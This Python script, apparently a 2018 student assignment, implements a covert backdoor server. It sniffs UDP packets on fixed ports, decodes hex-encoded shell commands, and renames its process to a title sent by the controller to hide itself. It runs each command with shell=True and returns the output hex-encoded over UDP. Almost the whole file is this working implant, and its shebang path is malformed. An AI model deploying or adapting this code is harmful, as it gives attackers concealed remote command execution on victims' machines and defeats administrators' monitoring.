#!/usr/binascii/python3



import os, argparse, time, subprocess, logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from subprocess import *
import binascii
import setproctitle

'''
Function:   readExecute

Programmer:     Yiaoping + Anthony

Date:           October 15th 2018

Notes: The purpose of function is to take the packet and
decode it from ascii. After decoding, we take the stored data and check what it is. 
If it's a quit message, we end the server. We take in the title that the client has 
sent and set the process to the name of the title. Next, we send the command to 
terminal for it to be executed. Once executed, it takes the return data and encodes it, 
then sends the data back to the client.
'''

def readExecute(pkt):
    message = pkt.load.decode("utf8")
    decodedText = binascii.unhexlify(message)
    checkExit = decodedText.decode()
    

    parseMessage = checkExit.split("\"")
    ptitle = parseMessage[0]

    command = parseMessage[1]
    if command == ("quit"):
        exit()

    setproctitle.setproctitle(ptitle)


    userInput = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    shellOutput = userInput.stdout.read() + userInput.stderr.read()
    newOutput = shellOutput.decode()

    if newOutput == "":
        newOutput = "Command completed. No output from terminal."

    bytesOutput = newOutput.encode("utf8")
    encodedOutput = binascii.hexlify(bytesOutput)

    
    pkt = IP(dst=pkt[0][1].src)/UDP(dport=8505, sport=8000)/encodedOutput
    send(pkt, verbose=0)


'''
Function:   main

Programmer:     Yiaoping

Date:           October 15th 2018

Notes: The purpose of this function is to take sniff for incoming packets
that are meant for the server. Once it sniffs the UDP packets, it executes the 
readExecute() function where it begins parsing the packets.
'''

def main():
    
    sniff(filter="udp and src port 8505 and dst port 8000", prn=readExecute)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print ('Exiting..')
